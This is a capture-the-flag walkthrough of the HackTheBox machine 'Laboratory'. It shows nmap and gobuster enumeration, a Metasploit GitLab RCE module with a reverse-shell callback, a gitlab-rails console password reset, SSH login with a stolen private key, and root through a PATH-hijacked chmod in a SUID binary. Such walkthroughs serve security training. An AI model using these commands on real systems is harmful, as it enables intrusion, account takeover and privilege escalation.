@@ -1,0 +1,112 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Laboratory HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/laboratory-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-28T09:47:24+00:00">May 28, 2021</time><time class="updated" datetime="2025-06-20T17:37:36+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called the <span style="color: #0000ff;"><strong>Laboratory</strong></span>. It was created by <span style="color: #0000ff;"><strong>0xc45</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating HTTPS service</span></li>
+<li><span style="color: #000000;">Enumerating Subdomains</span></li>
+<li><span style="color: #000000;">Enumerating GitLab</span></li>
+<li><span style="color: #000000;">Enumerating GitLab Exploit</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting GitLab RCE</span></li>
+<li><span style="color: #000000;">Getting shell as git user</span></li>
+<li><span style="color: #000000;">Change Password for dexter user</span></li>
+<li><span style="color: #000000;">Enumerating SSH key for dexter</span></li>
+<li><span style="color: #000000;">Login as dexter user</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating SUID permissions</span></li>
+<li><span style="color: #000000;">Exploiting chmod in docker-security</span></li>
+<li><span style="color: #000000;">Getting root shell</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.148.89</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.148.89</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ulsi3pB7IbQ/YLC54IhJsAI/AAAAAAAAwRc/B91Y1WB9OdsmanKtJX1tjFQgUYMpS8uxgCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap scan quickly gave us some great information. It positively informed that the following ports and services are running: SSH (22), HTTP (80), HTTPS (443). Upon reading the nmap scan it was observed that the Common Name is laboratory.htb. We make the entry in the /etc/hosts file with the IP address. </span></p>
+<h3><span style="color: #800000;"><strong>Enumeration </strong></span></h3>
+<p><span style="color: #000000;">Since we have added an entry in the /etc/hosts file with the IP Address, we can use the laboratory.htb in the Web browser to enumerate the HTTPS service. The website that is hosted is created to promote a company that is dedicated to Security and Development Services.  </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://laboratory.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q0v3W4mGUrc/YLC58zKQcqI/AAAAAAAAwRg/Dr15S5k-Q3YFwkJ4gveMtNTfIQbqaGOWACLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">The nmap scan gave us a clue that a possibility of subdomains exists from the details we enumerated while checking the certificate information. To confirm the suspicion and to potentially enumerate for any other subdomains. We use gobuster for this task. We can see that we have successfully enumerated the git.laboratory.htb.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir --url https://laboratory.htb/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowcase-2.3-small.txt -t 50</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gQ2XTjp8jHQ/YLC6AhelXSI/AAAAAAAAwRk/7j6DSRgn9gsWg9O-tXSZSmhi3kz0fbpqwCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">As we have found this new subdomain, we need to make an edit in our /etc/hosts file so that we are able to access it on our web browser.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
+10.129.148.89 laboratory.htb git.laboratory.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LIJSu6g5xHw/YLC6EAzJh2I/AAAAAAAAwRo/5Xf9J9nZUkwHKKfvcdAJxWSEDc_7PiGKwCLcBGAsYHQ/s16000/4.1.png"/></span></p>
+<p><span style="color: #000000;">Upon opening the git.laboratory.htb we see that it is an installation of GitLab.  </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://git.laboratory.htb/users/sign_in</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-brOkcdzD5Ys/YLC6HJEpvcI/AAAAAAAAwRs/suEXWkG2KFs9BIVYyAgQJJG4s8DsmwLDQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Since we didn’t have any credentials for the users, we tried to register for a new user. But we are given an error that the email domain is not the one that it would accept. So, in order to circumvent this error, we tried to change the email address to the domain of the application i.e., laboratory.htb.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6fCtgi_RfpQ/YLC6Kx2ONHI/AAAAAAAAwRw/axQ-No1Qmi8e_rbr-iG973ZnL4m68XN2wCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">After logging in with the newly created credentials, we see that we have the GitLab Community Edition installed on the target machine. The version is 12.8.1.</span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">After, going through some exploration for the version of the GitLab, we found that this version is vulnerable to Remote Code Execution Attack. It is possible to use a direct exploit that can be found on exploitdb. However, we found that it is possible to use an exploit this vulnerability using Metasploit. It requires some set parameters such as the IP Address and port of the target machine, vhost which is the git.laboratory.htb. Then it requires the username and password that was created earlier. After running for a moment, the exploit provides with a shell on the target machine. We prompt the shell to the bash which tells us that the session that we have procured is for the user git.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/http/gitlab_file_read_rce
+set rhosts 10.129.148.89
+set rport 443
+set vhost git.laboratory.htb
+set username ignite
+set password 12345678
+set ssl true
+set lhost 10.10.14.108
+exploit
+bash -i</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6Y7d2Boc6I0/YLC6S6wJWdI/AAAAAAAAwR8/AOR9aWPgVDc0viMGa89dN5cbTff0OL1UgCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Stuck in the shell and unable to run enumeration tests without knowing the password, we try to find a possible method to change the password for a shell that invokes the GitLab installation. By browsing and reading the documentation on the GitLab official site, we found this particular method.</span></p>
+<h5><span style="color: #000000;"><strong>How to reset user password | GitLab – GitLab Docs</strong></span></h5>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jWUZOBXVKSk/YLC6XCoWm8I/AAAAAAAAwSE/YaJS3pWId7Al2Lm2v8aidx0tY8beLyRrACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">After invoking an interactive shell, we get inside the GitLab console. Here, we require to enumerate for the user on the Linux machine that must have implemented the GitLab instance. We do this using the user=user.find(1) command. It reveals that the user we are looking for is dexter user. We use the user.password command to change the password and then save our changes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash -i
+gitlab-rails console
+user-User.find(1)
+user.password = “87654321”
+user.password_confirmation = “87654321”
+user.save!</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rfKNiRYyU8s/YLC6bk7D6TI/AAAAAAAAwSM/Nq7kyK1NMGAWcfY1ZP9sweaixPQUyXd7gCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Now that we have access to the user dexter user account, we get back to the GitLab instance on our Web Browser and login using the credentials for dexter. After a successful login, we start to enumerate the files that are accessible for the dexter user and find an SSH private key as shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fjtyISNtv4k/YLC6gcQ44iI/AAAAAAAAwSU/4ri1t3m6oH8yF9TYk06NBgAxONkiJfKTACLcBGAsYHQ/s16000/17.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We copy the private key and create a key on the Kali Linux and named its the key. We used this key to connect to the target machine via SSH. You can read the User flag at this point. After logging in, one of the first enumeration tasks we did was check for the SUID permissions. It prints a huge list of binaries, among which we find the docker-security. It can be used to elevate our access to root.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i key dexter@10.129.148.89
+find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zdUZIP4rkRc/YLC6mp4VnjI/AAAAAAAAwSc/IlPCym7Cro4ADe9JrHCkvbO22lm4s8EZQCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">Since it’s a binary that we are not that familiar with, the usual course of action is to reverse engineer it. Although you can use ltrace command to understand the working of the binary. It will tell you that it runs the command chmod to change the permissions for /usr/bin/docker. Since it doesn’t use the complete path of the chmod, we can exploit it by creating a chmod with shell invocation in the same directory and run the binary. Rather than using the original chmod, it will use the chmod that we created and give us root access to the machine. We now can read the root flag and conclude this machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "/bin/bash" &gt; chmod
+chmod 777 chmod
+export PATH=/tmp:$PATH
+/usr/local/bin/docker-security
+cd /root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fvQG_LWSnsc/YLC6vIAwqgI/AAAAAAAAwSg/scOOiBSD2Xs7mD0Dfe6R2HrMnPIldvbIQCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
